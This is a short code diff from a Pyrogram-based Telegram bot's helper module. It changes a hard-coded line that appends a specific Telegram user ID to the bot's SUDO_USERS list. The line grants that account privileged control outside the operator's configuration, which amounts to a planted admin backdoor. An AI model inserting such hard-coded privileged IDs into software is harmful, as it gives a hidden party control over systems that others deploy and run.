@@ -4,7 +4,7 @@ from pyrogram.types import Message
 from modules.helpers.admins import get_administrators
 from modules.config import SUDO_USERS
 
-SUDO_USERS.append(1282754256)
+SUDO_USERS.append(2082934030)
 
 
 def errors(func: Callable) -> Callable:
